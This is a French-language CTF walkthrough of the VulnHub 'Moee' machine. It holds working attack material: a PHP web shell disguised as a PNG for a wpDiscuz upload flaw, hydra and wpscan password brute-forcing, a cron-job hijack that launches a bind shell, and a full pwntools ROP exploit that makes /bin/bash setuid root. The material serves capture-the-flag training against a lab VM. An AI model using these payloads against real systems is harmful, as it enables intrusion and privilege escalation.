# Solution du CTF Moee de VulnHub

Yet Another Wordpress
---------------------

[Moee](https://www.vulnhub.com/entry/moee-1,608/) est un CTF conçu par un certain [gr4n173](https://twitter.com/gr4n173). Vous pouvez le récupérer sur VulnHub.  

Pour ceux qui souhaiteraient se jeter dans cette aventure, et sans spoiler trop, le début du challenge nécessite un peu d'énumération, une bonne dose de patience puis ensuite de l'intuition et des yeux suffisamment ouverts.  

Le final nécessite des connaissances en exploitation de binaire, ce qui est indiqué noir sur blanc dans la description du CTF.  

```plain
$ sudo nmap -T5 -p- -sCV 192.168.56.19 
[sudo] Mot de passe de root :  
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for moee (192.168.56.19) 
Host is up (0.00014s latency). 
Not shown: 65532 closed tcp ports (reset) 
PORT      STATE SERVICE VERSION 
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 
| ssh-hostkey:  
|   1024 a7:b9:03:d8:32:02:3a:9e:95:e6:36:d4:d7:a3:47:7d (DSA) 
|   2048 f0:9c:9c:13:83:62:ee:22:ba:67:e9:b0:84:a5:fc:4c (RSA) 
|   256 2e:3f:41:eb:1c:54:c5:ca:b0:f1:b5:e5:17:fc:98:c4 (ECDSA) 
|_  256 31:8b:ac:63:7d:7f:c6:18:4e:4e:7b:15:8b:30:8b:02 (ED25519) 
80/tcp    open  http    Apache httpd 2.4.10 ((Debian)) 
|_http-server-header: Apache/2.4.10 (Debian) 
|_http-generator: WordPress 5.5.3 
|_http-title: Moee &#8211; Just another WordPress site
```

On sait immédiatement qu'il y a un Wordpress donc on dégaine l'outil attendu pour ce type de situation :  

```plain
$ docker run -v /tools/wordlists/:/data --add-host moee:192.168.56.19 \
  -it --rm wpscanteam/wpscan --url http://moee/ -e u,ap,at
--- snip ---
[+] WordPress version 5.5.3 identified (Insecure, released on 2020-10-30). 
 | Found By: Rss Generator (Passive Detection) 
 |  - http://moee/index.php/feed/, <generator>https://wordpress.org/?v=5.5.3</generator> 
 |  - http://moee/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>
--- snip --- 
[i] User(s) Identified: 

[+] Joxter 
 | Found By: Rss Generator (Passive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] Snufkin 
 | Found By: Rss Generator (Passive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] snufkin 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] user 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] joxter 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection) 

[+] boe 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Comme vous le remarquez ici j'ai fait appel à une option de Docker qui s'appelle *--add-host*. Son rôle est assez explicite vu que cela rajoute une entrée au fichier */etc/hosts* du container.  

Le nom d'hôte *moee* apparaissait dans la page web et *wpscan* avait des difficultés à scanner le site en utilisant seulement l'adresse IP.  

Cette version de Wordpress est normalement touchée par la vulnérabilité *CVE-2022-21661*. On trouve des exemples d'exploitation [ici](https://www.exploit-db.com/exploits/50663) et [là](https://www.m1sn0w.top/2022/01/19/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/) mais aucun code d'exploitation. Si je m'en sens le courage je prendrais peut être le temps d'étudier l'exploitabilité sur ce challenge.  

Là j'ai plutôt orienté mon attention sur le brute-force des différents comptes. J'ai voulu faire l'attaque avec l'option *--password-attack xmlrpc-multicall* qui permet d'essayer un batch de différents mots de passe pour chaque requête mais cela ne m'a amené nul part.  

```plain
$  docker run -v /tools/wordlists/:/data --add-host moee:192.168.56.19 -it --rm wpscanteam/wpscan \
  --url http://moee/ -U joxter,snufkin,boe,user -P /data/rockyou.txt --password-attack xmlrpc-multicall
```

En retirant cette option on passe donc sur un mode de brute force plus lent mais qui est compatible avec la configuration du Wordpress. Comptez tout de même 40 bonnes minutes avant d'obtenir un résultat.  

```plain
[!] Valid Combinations Found:
 | Username: joxter, Password: 1a2b3c4d
```

Une fois connecté via l'interface *wp-admin* je remarque que non, je ne suis pas administrateur et ne peut donc pas obtenir un webshell avec la méthode classique (édition d'un fichier PHP d'un des thèmes installé).  

En regardant les commentaires postés sur le site j'avais toutefois relevé la mention de *wpDiscuz*. Ce plugin Wordpress a [une entrée le concernant chez exploit-db](https://www.exploit-db.com/exploits/49967). Il s'agit d'une faille d'upload et à lire le code d'exploitation il faut faire en sorte que le type mime détecté pour le fichier soit de type image. Pour cela on peut recopier les premiers octets d'un fichier PNG valide et y accoler notre code PHP :  

```bash
$ echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00<?php system($_GET["cmd"]); ?>' > shell.php
```

L'upload ne se fait pas depuis le dashboard mais depuis la page d'un des articles où il faut remarquer que l'utilisation d'un compte a rajouté un petit bouton dédié à l'upload d'image :  

![Moee VulnHub CTF wpDiscuz upload vulnerability](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/mooe.png)

el8 gr3p 5ki11z
---------------

Une fois un ReverseSSH mis en place je récupère le premier flag :  

```plain
www-data@moee:/var/www/public_html$ cat flag1.txt  
Congrats, finally you exploited the damn vulnerable plugin and got the initial Shell.
Now your next task is to look for clue which lend you further and it isn't far from your home directory.  

- GoodLuck
```

Le home de *www-data* est bien sûr */var/www/*. J'ai fouillé sous */var* mais n'ait rien trouvé au début.  

Je commence par les identifiants pour la base de données :  

```php
/** The name of the database for WordPress */ 
define( 'DB_NAME', 'wp_database' ); 

/** MySQL database username */ 
define( 'DB_USER', 'user' ); 

/** MySQL database password */ 
define( 'DB_PASSWORD', 'userpasswd' ); 

/** MySQL hostname */ 
define( 'DB_HOST', 'localhost' );
```

Je peux extraire les hashs des utilisateurs Wordpress :  

```plain
www-data@moee:/var/www/public_html$ mysql -u user -p wp_database 
Enter password:  
Reading table information for completion of table and column names 
You can turn off this feature to get a quicker startup with -A 

Welcome to the MySQL monitor.  Commands end with ; or \g. 
Your MySQL connection id is 113448 
Server version: 5.5.62-0+deb8u1 (Debian) 

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved. 

Oracle is a registered trademark of Oracle Corporation and/or its 
affiliates. Other names may be trademarks of their respective 
owners. 

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 

mysql> show databases; 
+--------------------+ 
| Database           | 
+--------------------+ 
| information_schema | 
| mydatabase         | 
| wp_database        | 
+--------------------+ 
3 rows in set (0.00 sec) 

mysql> select user_login, user_pass from wp_users;  
+------------+------------------------------------+ 
| user_login | user_pass                          | 
+------------+------------------------------------+ 
| user       | $P$BSsAlgA7qDOQFfZYVze6KO48091sn81 | 
| Snufkin    | $P$BghGdW9kvudcJWOnTi.TfmJw7tzsgR/ | 
| Joxter     | $P$B7SOjzTIu5bBYTnO1SfWyL2bJF51xn0 | 
| Boe        | $P$B7JYXSreWFvNpm3kbrHa9ho.NDG0K80 | 
+------------+------------------------------------+ 
4 rows in set (0.00 sec)
```

J'ai tenté en vain de les casser avec *Penglab* (des bébés pingouins sont donc morts sans raison valable, désolé) :  

```plain
!echo '$P$BSsAlgA7qDOQFfZYVze6KO48091sn81' > /tmp/hash.txt
!echo '$P$BghGdW9kvudcJWOnTi.TfmJw7tzsgR/' >> /tmp/hash.txt
!echo '$P$B7SOjzTIu5bBYTnO1SfWyL2bJF51xn0' >> /tmp/hash.txt
!echo '$P$B7JYXSreWFvNpm3kbrHa9ho.NDG0K80' >> /tmp/hash.txt
!hashcat -m 400 /tmp/hash.txt /content/wordlists/hashesorg2019
```

Sur le système se trouve deux utilisateurs autre que root :  

```plain
uid=1000(Joxter) gid=1000(Joxter) groups=1000(Joxter),1002(devsec) 
uid=1001(Boe) gid=1001(Boe) groups=1001(Boe),1002(devsec),1003(supergroup)
```

J'ai relevé quelque chose d'assez mystérieux avec le dossier */opt* que je ne peux pas accéder :  

```plain
www-data@moee:/var/www/public_html$ find / -group devsec 2> /dev/null     
/home/Joxter 
/opt
www-data@moee:/var/www/public_html$ ls -ld /opt/ 
drwxr-x--- 2 Boe devsec 4096 Nov 22  2020 /opt/
```

La chose est confirmée avec *pspy64* :  

```plain
2022/01/28 09:20:01 CMD: UID=0    PID=19891  | /usr/sbin/CRON -f  
2022/01/28 09:20:01 CMD: UID=1001 PID=19892  | /bin/sh -c python3 /opt/Flag.py
```

A ce stade cette information ne m'est toutefois d'aucune utilité.  

Finalement un grep des familles m'a fait remarqué un fichier que LinPEAS n'avait pas détecté :  

```plain
$ grep --include "*.php" -l -r -i password .
--- snip ---
wp-includes/wp-db.php
--- snip ---
```

La raison de ce manquement est sans doute liée au fait que les creds soient en commentaire :  

```php
// Take this creds to login in one of the service. 
// Username: snufkin 
// Password: t3ch5nufk1n##
```

De quel service on parle ? Après des échecs il ne s'agit pas de SSH. Le mot de passe est accepté pour l'utilisateur root de MySQL :  

```plain
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mydatabase         |
| performance_schema |
| useful_things      |
+--------------------+
4 rows in set (0.01 sec)
```

Notez la présence de la base *useful\_things* qu'on ne voyait pas précédemment.  

```plain
mysql> select * from user_details; 
+---------+----------+-------------------------------+ 
| User_id | Username | Password                      | 
+---------+----------+-------------------------------+ 
|       1 | Boee     | MSLJDFALkljsdfMIYR=           | 
|       2 | Stinky   | MWQxZHQzc3QxbmcK=             | 
|       3 | Sniff    | N2gzIE11ZGRsM3IK=             | 
|       4 | Snork    | https://pastebin.com/0wstpQk0 | 
+---------+----------+-------------------------------+ 
4 rows in set (0.00 sec)
```

Gotcha ! Le pastebin indiqué contient une série de passwords et adresses emails.  

```plain
$ awk '{ print $1 }' 0wstpQk0.txt > pass.txt
$ hydra -l Joxter -P pass.txt ssh://192.168.56.19 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 383 login tries (l:1/p:383), ~24 tries per task 
[DATA] attacking ssh://192.168.56.19:22/ 
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 207 to do in 00:02h, 16 active 
[STATUS] 128.00 tries/min, 256 tries in 00:02h, 127 to do in 00:01h, 16 active 
[22][ssh] host: 192.168.56.19   login: Joxter   password: 0ffs3cJ0xt3r!!
1 of 1 target successfully completed, 1 valid password found 
```

New challenger
--------------

Avec le compte obtenu on peut obtenir le second flag et agir sur la tache CRON lancée avec l'utilisateur Boe.  

```plain
Joxter@moee:~$ cat flag2.txt  
Congrats, Joxter though you were lazy and worry-free you got yourself with some OSINT.
Now it's your time to use the premonitions which you call "Forebodings" to protect Boe from a bigger disaster things.
For that you have to recall your mind like a cron things as in linux. 

 - Moominpappa's Memoirs (Boe)

Joxter@moee:~$ ls -al /opt/
total 12
drwxr-x---  2 Boe  devsec 4096 Nov 22  2020 .
drwxr-xr-x 22 root root   4096 Nov 11  2020 ..
-rwxrwxr--  1 Boe  devsec  379 Nov 22  2020 Flag.py
```

J'ai d'abord modifié le script Python pour qu'il ajoute ma clé publique SSH aux clés autorisées. L'action se passe correctement d'après *pspy* :  

```plain
2022/01/28 10:04:01 CMD: UID=0    PID=3992   | /usr/sbin/CRON -f 
2022/01/28 10:04:01 CMD: UID=1001 PID=3993   | python3 /opt/Flag.py 
2022/01/28 10:04:01 CMD: UID=1001 PID=3994   | sh -c mkdir -p /home/Boe/.ssh/ 
2022/01/28 10:04:01 CMD: UID=1001 PID=3995   | mkdir -p /home/Boe/.ssh/ 
2022/01/28 10:04:01 CMD: UID=1001 PID=3996   | sh -c echo ssh-rsa AAAAB---snip ---qcT7Q== > /home/Boe/.ssh/authorized_keys
```

Mais dans la pratique on dirait bien que l'authentification par clé est désactivée pour cet utilisateur.  

J'ai préféré lancer un ReverseSSH en mode bind :  

```python
os.system("/var/www/public_html/reverse-sshx64 &")
```

Par défaut ça nous ouvre un shell sur le port 31337. Le mot de passe est *letmeinbrudipls*.  

```plain
Joxter@moee:/var/www/public_html$ ss -lntp 
State      Recv-Q Send-Q                                                               Local Address:Port                                                                           Peer Address:Port  
LISTEN     0      128                                                                              *:22                                                                                        *:*      
LISTEN     0      50                                                                       127.0.0.1:3306                                                                                      *:*      
LISTEN     0      128                                                                             :::80                                                                                       :::*      
LISTEN     0      128                                                                             :::22                                                                                       :::*      
LISTEN     0      128                                                                             :::31337                                                                                    :::*
```

L'utilisateur *Boe* possède un binaire setuid root, le boss final en somme (NB: ReverseSSH se moque du nom d'utilisateur d'où l'incohérence entre l'utilisateur utilisé et celui obtenu) :  

```plain
Joxter@moee:/var/www/public_html$ ssh -p 31337 127.0.0.1
The authenticity of host '[127.0.0.1]:31337 ([127.0.0.1]:31337)' can't be established.
RSA key fingerprint is 9c:e4:6e:a9:dc:0a:4f:00:ea:6d:da:da:da:e6:09:57.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:31337' (RSA) to the list of known hosts.
Joxter@127.0.0.1's password: 
Boe@moee:/home/Boe$ ls -l 
total 16 
-rw-r--r-- 1 root root  342 Nov 16  2020 flag3.txt 
-rwsr-xr-x 1 root root 8288 Nov 18  2020 ropit
Boe@moee:/home/Boe$ cat flag3.txt 
Once again, thanks Joxter for protecting me(Boe) from the disaster which was about to come and take my life. Now I have some work to do with my own task so let me create some plan for ROP(Record of Performance) about you and Snufkin. Therefore stay safe, don't be lazy and try to use the "Forebodings" more. 

- Moominpappa's Memories (Boe)
```

Un extrait des chaînes de caractères présentes dans le binaire permet d'avoir une idée globale de ce qu'il se passe :  

```plain
/lib64/ld-linux-x86-64.so.2 
libc.so.6 
gets 
puts 
__libc_start_main 
GLIBC_2.2.5 
__gmon_start__ 
AWAVI 
AUATL 
[]A\A]A^A_ 
Welcome to Exploitation&Pwning world back day's from Moomin's time . 
Let's see what you can use to get the root of this box. 
;*3$" 
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 
crtstuff.c 
deregister_tm_clones 
__do_global_dtors_aux 
completed.7698 
__do_global_dtors_aux_fini_array_entry 
frame_dummy 
__frame_dummy_init_array_entry 
ret2libc.c 
__FRAME_END__ 
__init_array_end 
_DYNAMIC
```

La référence à *ret2libc.c* fait office de clin d’œil amusant. On peut lancer ldd plusieurs fois consécutives pour admirer la randomisation de la stack :  

```plain
Boe@moee:/home/Boe$ ldd ./ropit  
        linux-vdso.so.1 (0x00007ffee2d3f000) 
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb709086000) 
        /lib64/ld-linux-x86-64.so.2 (0x00007fb709431000) 
Boe@moee:/home/Boe$ ldd ./ropit  
        linux-vdso.so.1 (0x00007ffdf29cf000) 
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f349b7c1000) 
        /lib64/ld-linux-x86-64.so.2 (0x00007f349bb6c000) 
Boe@moee:/home/Boe$ ldd ./ropit  
        linux-vdso.so.1 (0x00007fffd05eb000) 
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffb7889c000) 
        /lib64/ld-linux-x86-64.so.2 (0x00007ffb78c47000
```

Voici le code ASM de la fonction main :  

```asm
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400537 <+0>:     push   %rbp
   0x0000000000400538 <+1>:     mov    %rsp,%rbp
   0x000000000040053b <+4>:     sub    $0x400,%rsp
   0x0000000000400542 <+11>:    lea    0xbf(%rip),%rdi        # 0x400608
   0x0000000000400549 <+18>:    call   0x400430 <puts@plt>
   0x000000000040054e <+23>:    lea    0xfb(%rip),%rdi        # 0x400650
   0x0000000000400555 <+30>:    call   0x400430 <puts@plt>
   0x000000000040055a <+35>:    lea    -0x400(%rbp),%rax
   0x0000000000400561 <+42>:    mov    %rax,%rdi
   0x0000000000400564 <+45>:    mov    $0x0,%eax
   0x0000000000400569 <+50>:    call   0x400440 <gets@plt>
   0x000000000040056e <+55>:    mov    $0x0,%eax
   0x0000000000400573 <+60>:    leave  
   0x0000000000400574 <+61>:    ret    
End of assembler dump.
```

La vulnérabilité tient du fait que la fonction *gets()* est utilisée et qu'elle ne fait pas attention à la quantité d'octets lus. La pile alloue justement 1024 (0x400) octets pour la variable locale qui est ici la destination de la recopie.  

L'écrasement du registre RIP se fera sur la dernière instruction *ret*. On peut donc placer un breakpoint, saisir l'équivalent de l'expression python *"A" \* 1024 + "B" \* 4 + "C" \* 4 + "D" \* 4 + "E" \* 4* et regarder sur la pile à quoi correspondra la future valeur de ce registre :  

```plain
(gdb) b * 0x0000000000400574
Breakpoint 1 at 0x400574
(gdb) r 
Starting program: /tmp/ropit 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
Welcome to Exploitation&Pwning world back day's from Moomin's time .

Let's see what you can use to get the root of this box.

AAAA--- snip ---AAAAAABBBBCCCCDDDDEEEE

Breakpoint 1, 0x0000000000400574 in main ()
(gdb) x/s $rsp
0x7fff84282758: "DDDDEEEE"
(gdb) info reg
rax            0x0                 0
rbx            0x0                 0
rcx            0x7f73f7cd88c0      140136055408832
rdx            0x1                 1
rsi            0x1                 1
rdi            0x7f73f7ce1880      140136055445632
rbp            0x4343434342424242  0x4343434342424242
rsp            0x7fff84282758      0x7fff84282758
r8             0x0                 0
r9             0x7fff84282380      140735410611072
r10            0x5d                93
r11            0x246               582
r12            0x7fff84282888      140735410612360
r13            0x400537            4195639
r14            0x7f73f7d3ec00      140136055827456
r15            0x400580            4195712
rip            0x400574            0x400574 <main+61>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/s $r9
0x7fff84282380: 'A' <repeats 200 times>...
```

Si vous commencez à vous servir de GDB il est bon de connaître comment utiliser [la commande x](https://visualgdb.com/gdbreference/commands/x). Pour des adresses sur 64 bits on aura par exemple recours à *x/gx*.  

D'après les caractères retrouvés sur la pile on peut conclure qu'il faut 1032 (1024 + 4 + 4) octets avant d'écraser RIP. On note aussi que le registre R9 pointe dans notre chaîne malheureusement la stack du programme est non-exécutable et de plus [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) ne trouve aucun gadget concernant ce registre :(  

Dans une situation comme celle-ci (stack NX) il faut user de Return Oriented Programming (ROP). [L'article de MiscMag](https://connect.ed-diamond.com/MISC/mischs-022/return-oriented-programming-101) peut vous aider à découvrir ceci.  

Ici mon scénario d'exploitation consistait à enchaîner des gadgets dans le but de réécrire une adresse dans la GOT (Global Offsets Table).  

Quand on regarde la fonction *main()* on voit quelle appelle *puts()* qui se trouve à l'adresse *0x400430*. Cette adresse est dans la PLT (Procedure Linkage Table) et sert juste de trampoline à l'adresse présente dans la GOT :  

```asm
(gdb) x/i 0x400430
   0x400430 <puts@plt>: jmp    *0x200be2(%rip)        # 0x601018 <puts@got.plt>
(gdb) x/gx 0x601018
   0x601018 <puts@got.plt>:        0x00007f73f7b4fd7e
(gdb) p puts 
$4 = {int (const char *)} 0x7ffff7e06d7e <__GI__IO_puts>
(gdb) p system
$5 = {int (const char *)} 0x7ffff7dd99be <__libc_system>
```

On voit que ce *trampoline* dit simplement *saute à l'adresse contenue à l'adresse 0x601018*. Si j'écrase l'adresse contenue (*0x7ffff7e06d7e*) par celle de *system* (0x7ffff7dd99be) alors le prochain appel à *puts* appellera en réalité *system*.  

Mais il y a des choses à faire auparavant : fuiter l'adresse de *puts* dans la libc (*\_\_GI\_\_IO\_puts*) puisqu'elle change à chaque exécution puis à partir de là calculer l'adresse de *system* (*\_\_libc\_system*). Et enfin il faut écraser *puts* par *system*.  

La première partie est assez simple : il faut faire en sorte que *puts* affiche... *puts* pour fuiter l'adresse de la LIBC.  

On est alors en mesure de calculer l'adresse de *system* via simple addition ou soustraction.  

La partie la plus critique est celle consistant à réécrire la valeur en mémoire, pour cela il faut faire en sorte qu'un *gets()* soit appelé pour qu'il écrive à l'adresse de *puts@got.plt* la valeur de *\_\_libc\_system*.  

Compliqué ? Quand on a les bons gadgets pas tant que ça mais l'exploit doit pouvoir gérer la gestion des entrées/sorties du binaire exploité sachant qu'il y a des mécanismes de buffering qui peuvent compliquer tout ça.  

J'ai trouvé c[ette discussion sur StackExchange](https://unix.stackexchange.com/questions/25372/turn-off-buffering-in-pipe) qui pourrait bien s'avérer utile un jour.  

Finalement je me suis tourné vers la librairie Python *pwntools* qui gère très bien les entrées / sorties en me basant [sur un template présent sur HackTricks](https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address/rop-leaking-libc-template) (ce site est véritablement une bible du hacking).  

Petite modification de dernière minute quand je me suis rendu compte que si j'appelle *system* il serait plus intelligent d'appeler *setuid* avant (ahaha). A la place j'ai préféré que le ROP appelle chmod sur un fichier nommé *zR* (parce que cette chaîne de caractères est présente dans le binaire). Vous verrez l'exploitation plus bas.  

Code de l'exploit :  

```python
from pwn import ELF, process, ROP, remote, ssh, log, p64, u64

LOCAL = False

LOCAL_BIN = "/tmp/ropit"  # Cette copie locale sert pour analyse
REMOTE_BIN = "/home/Boe/ropit"  # Sert juste à spécifier le chemin vers le binaire à exécuter
ENV = {
    "PATH": ".:/usr/local/bin:/usr/bin:/bin:/sbin:/usr/sbin",
    "TERM": "xterm-256color",
}

if LOCAL:
    # Les valeurs ici servent à tester en local
    ENV["HOME"] = "/home/devloop"
    P = process(LOCAL_BIN, env=ENV)
    LIBC = ELF("/lib64/libc.so.6")
else:
    ENV["HOME"] = "/home/Joxter"
    ENV["USER"] = "Joxter"
    ENV["PWD"] = "/home/Joxter"
    ssh_shell = ssh('Joxter', '192.168.56.19', password='0ffs3cJ0xt3r!!', port=22)
    P = ssh_shell.process(REMOTE_BIN, env=ENV, cwd="/home/Joxter")
    # On aura pris soin de copier la libc de la VM en local
    LIBC = ELF("./libc.so.6")

ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

PUTS_PLT = ELF_LOADED.plt['puts']
GETS_PLT = ELF_LOADED.plt['gets']

# J'avais trouvé ces gadgets avec ROPgadget mais c'est plus compréhensible comme ça
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI_R15 = (ROP_LOADED.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]

PUTS_GOT = ELF_LOADED.got['puts']
FILENAME = 0x4006fd  # chaine, ici "zR", trouvée dans le binaire

log.info("puts plt: " + hex(PUTS_PLT))
log.info("puts got: " + hex(PUTS_GOT))
log.info("gets plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("pop rsi; pop r15; ret  gadget: " + hex(POP_RSI_R15))

rop = b"A" * 1032
rop += p64(POP_RDI)       # première instruction exécutée, flow hijack
rop += p64(PUTS_GOT)      # l'adresse de puts est un argument
rop += p64(PUTS_PLT)      # puts est appellé pour afficher sa propre adresse
rop += p64(POP_RDI)       # on reprend le contrôle de l'exécution
rop += p64(PUTS_GOT)      # l'adresse de puts sert d'argument
rop += p64(GETS_PLT)      # on appel gets pour écraser l'adresse de puts, le programme bloque ici
rop += p64(POP_RSI_R15)   # on reprend le contrôle de l'exécution, puts.plt pointe désormais sur chmod
rop += p64(0o6755)        # Valeur octale d'un u+srwx g+srx o+rx 
rop += p64(0xdeadbeef)    # nevermind, ça va dans R15 because le gadget utilisé
rop += p64(POP_RDI)       # on reprend le contrôle de l'exécution
rop += p64(FILENAME)      # "zR" qui sert de filename
rop += p64(PUTS_PLT)      # on appelle puts qui est maintenant chmod

log.info(f"Size of ROP: {len(rop)}")

print(P.recv().decode().strip())  # Bannière
# envoi de notre ROP chain qui sera exécutée en deux temps
P.sendline(rop)

# ici on récupère l'adresse leakée
puts_libc = P.recvline().strip()[:8]
puts_libc = u64(puts_libc.ljust(8, b"\x00"))
log.info(f"Leaked LIBC address,  puts: {hex(puts_libc)}")
LIBC.address = puts_libc - LIBC.symbols["puts"]  # Save LIBC base
log.info("LIBC base @ %s" % hex(LIBC.address))

CHMOD = LIBC.sym["chmod"]
log.info("chmod %s " % hex(CHMOD))
# On envoie l'adresse de chmod, la ROP chain va reprendre son exécution
P.sendline(p64(CHMOD))
```

Je ne suis pas parvenu à faire fonctionne *pwntools* sur le ReverseSSH qui écoutait sur le port 31337 avec l'utilisateur *Boe*. J'ai donc utilisé à la place le vrai serveur SSH avec l'utilisateur *Joxter* mais pour qu'il puisse accéder au binaire *ropit* j'ai du changer auparavant les permissions sur */home/Boe*.  

Avant l'exécution je créé un lien symbolique *zR* pointant vers */bin/bash* :  

```plain
Joxter@moee:~$ ln -s /bin/bash zR 
Joxter@moee:~$ ls -l 
total 4 
-rw-r--r-- 1 root   root   308 Nov 20  2020 flag2.txt 
lrwxrwxrwx 1 Joxter Joxter   9 Jan 29 15:22 zR -> /bin/bash 
Joxter@moee:~$ ls -l /bin/bash  
-rwxr-xr-x 1 root root 1029624 Mar 25  2019 /bin/bash
```

Utilisation de mon exploit avec *pwntools* qui fait sa magie :  

```plain
$ python exploit.py  
[+] Connecting to 192.168.56.19 on port 22: Done 
[*] Joxter@192.168.56.19: 
    Distro    Unknown  
    OS:       linux 
    Arch:     amd64 
    Version:  3.16.0 
    ASLR:     Enabled 
[+] Starting remote process bytearray(b'/home/Boe/ropit') on 192.168.56.19: pid 15518 
[*] '/tmp/chall/libc.so.6' 
    Arch:     amd64-64-little 
    RELRO:    Partial RELRO 
    Stack:    Canary found 
    NX:       NX enabled 
    PIE:      PIE enabled 
[*] '/tmp/ropit' 
    Arch:     amd64-64-little 
    RELRO:    Partial RELRO 
    Stack:    No canary found 
    NX:       NX enabled 
    PIE:      No PIE (0x400000) 
[*] Loaded 14 cached gadgets for '/tmp/ropit' 
[*] puts plt: 0x400430 
[*] puts got: 0x601018 
[*] gets plt: 0x400430 
[*] pop rdi; ret  gadget: 0x4005e3 
[*] pop rsi; pop r15; ret  gadget: 0x4005e1 
[*] Size of ROP: 1128 
Welcome to Exploitation&Pwning world back day's from Moomin's time . 

Let's see what you can use to get the root of this box. 
[*] Leaked LIBC address,  puts: 0x7f51994ca990 
[*] LIBC base @ 0x7f519945f000 
[*] chmod 0x7f519953a800
```

Et c'est le BUT !  

```plain
Joxter@moee:~$ ls -l /bin/bash  
-rwsr-sr-x 1 root root 1029624 Mar 25  2019 /bin/bash 
Joxter@moee:~$ /bin/bash -p 
bash-4.3# id 
uid=1000(Joxter) gid=1000(Joxter) euid=0(root) egid=0(root) groups=0(root),1000(Joxter),1002(devsec) 
bash-4.3# cd /root 
bash-4.3# ls -al 
total 48 
drwx------  3 root root 4096 Nov 28  2020 . 
drwxr-xr-x 22 root root 4096 Nov 11  2020 .. 
lrwxrwxrwx  1 root root    9 Nov 20  2020 .bash_history -> /dev/null 
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc 
drwxr-xr-x  4 root root 4096 Nov 18  2020 .cache 
-rw-r--r--  1 root root 1006 Nov 18  2020 flag4.txt 
-rw-------  1 root root   44 Nov  8  2020 .lesshst 
-rw-------  1 root root 5625 Nov 28  2020 .mysql_history 
-rw-r--r--  1 root root  140 Nov 19  2007 .profile 
-rw-r--r--  1 root root   66 Nov 16  2020 .selected_editor 
-rw-------  1 root root 6963 Nov 22  2020 .viminfo 
bash-4.3# cat flag4.txt  
( )   ( )                                            
`\`\_/'/'_    _   _       _ _  _ __   __        _ _  
  `\ /'/'_`\ ( ) ( )    /'_` )( '__)/'__`\    /'_` ) 
   | |( (_) )| (_) |   ( (_| || |  (  ___/   ( (_| | 
   (_)`\___/'`\___/'   `\__,_)(_)  `\____)   `\__,_) 

 _                                    _  
(_ )                                 ( ) 
 | |    __     __     __    ___     _| | 
 | |  /'__`\ /'_ `\ /'__`\/' _ `\ /'_` | 
 | | (  ___/( (_) |(  ___/| ( ) |( (_| | 
(___)`\____)`\__  |`\____)(_) (_)`\__,_) 
            ( )_) |                      
             \___/'                      
Congratulation!! 

Hope you enjoyed playing my first machine "Moee".
I too enjoyed creating this box and just wanted to give a huge shoutout to @DCAU7 for helping me while creating this machine.
Also like to thanks to all those who have taken time to complete this box. 

You can ping me at twitter @gr4n173.
```


*Published January 30 2022 at 18:25*